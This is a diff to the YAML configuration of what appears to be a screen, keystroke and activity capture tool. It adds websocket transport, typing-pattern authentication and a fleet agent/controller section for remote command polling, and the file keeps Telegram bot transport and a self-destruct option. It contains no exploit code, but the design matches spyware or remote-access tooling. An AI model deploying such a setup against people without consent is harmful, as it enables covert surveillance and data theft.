@@ -14,6 +14,7 @@ capture:
   mouse:
     enabled: false
     track_movement: false
+    move_throttle_interval: 0.1  # Seconds between move events when tracking
   screenshot:
     enabled: true
     quality: 80
@@ -83,6 +84,13 @@ transport:
     bot_token: ""
     chat_id: ""
 
+  websocket:
+    url: ""
+    reconnect_interval: 5
+    heartbeat_interval: 30
+    ssl: false
+    verify_ssl: true
+
 encryption:
   enabled: false
   mode: "symmetric"         # "symmetric" (AES-256-CBC) or "e2e"
@@ -111,6 +119,10 @@ biometrics:
   sample_size: 500
   profile_id_prefix: "usr"
   store_profiles: true
+  authentication:
+    enabled: false           # Enable user authentication via typing patterns
+    match_threshold: 50.0    # Distance threshold for profile matching (lower = stricter)
+    min_samples: 100         # Minimum keystrokes needed for reliable authentication
 
 profiler:
   enabled: false
@@ -144,7 +156,7 @@ profiler:
       - "Netflix"
     uncategorized:
       - "*"
-  store_profiles: true
+  # store_profiles: true  # Unused — profiler.store_profiles is never read by code
 
 pipeline:
   enabled: false
@@ -191,7 +203,65 @@ service:
   restart_sec: 10
   start_limit_burst: 3
   start_limit_interval: 60
-  display: ":0"
+  # display: ":0"  # Unused — not read by any service manager code
+
+fleet:
+  enabled: false
+  database_path: "./data/fleet.db"
+
+  # Agent configuration (used by fleet/run_agent.py and agent_controller.py)
+  agent:
+    # agent_id: ""                # Auto-generated UUID if not specified
+    controller_url: ""            # URL of the fleet controller
+    # hostname: ""                # Auto-detected from socket.gethostname()
+    # platform: ""                # Auto-detected from sys.platform
+    version: "1.0.0"
+    heartbeat_interval: 60        # Seconds between heartbeats
+    reconnect_interval: 30        # Seconds between reconnection attempts
+    max_retries: 5                # Max reconnection attempts before giving up
+    command_poll_interval: 5      # Seconds between command polls (HTTP mode)
+    sign_requests: false          # Sign outgoing requests with agent private key (match require_signature_verification)
+    transport_method: "http"      # Transport: "http" or "websocket"
+
+  auth:
+    jwt_secret: "CHANGE_ME_IN_PRODUCTION"  # 32+ char secret
+    # Set to true explicitly for development/testing to allow the default JWT secret.
+    # In production, this must remain false and a real secret must be configured.
+    allow_default_secret: false
+    access_token_ttl_minutes: 15
+    refresh_token_ttl_days: 7
+    # NOTE: max_failed_attempts and lockout_minutes are defined but not yet enforced
+    max_failed_attempts: 5        # TODO: Implement login attempt tracking
+    lockout_minutes: 30           # TODO: Implement account lockout
+
+  controller:
+    max_agents: 1000
+    heartbeat_timeout: 120        # Seconds before agent marked offline
+    max_command_history: 1000     # Max completed commands to retain
+    cleanup_interval: 300         # Seconds between cleanup runs
+    # NOTE: command_timeout_seconds and max_queue_depth are defined but not yet enforced
+    heartbeat_timeout_seconds: 300  # TODO: Implement timeout monitoring
+    command_timeout_seconds: 60     # TODO: Implement command timeout
+    max_queue_depth: 1000           # TODO: Implement queue depth limiting
+
+  transport:
+    # NOTE: These toggles are defined but not yet enforced - all transports are available
+    http_enabled: true            # TODO: Check before allowing HTTP transport
+    websocket_enabled: true       # TODO: Check before allowing WebSocket transport
+    redis_enabled: false          # TODO: Check before allowing Redis transport
+    redis_url: "redis://localhost:6379"
+
+  security:
+    # NOTE: max_payload_size_mb and rate_limit are defined but not yet enforced
+    max_payload_size_mb: 10       # TODO: Implement payload size validation
+    rate_limit_requests_per_minute: 60  # TODO: Implement rate limiting
+    # Signature verification: when enabled, agents must sign requests with their
+    # private key and include the signature in the X-Signature header (base64).
+    # The controller verifies using the agent's stored public key.
+    # SECURITY NOTE: Set to true in production to prevent request forgery.
+    # TLS provides transport encryption; signatures provide authentication/integrity.
+    # Must match fleet.agent.sign_requests — both must be true or both false.
+    require_signature_verification: false
 
 self_destruct:
   secure_wipe: false
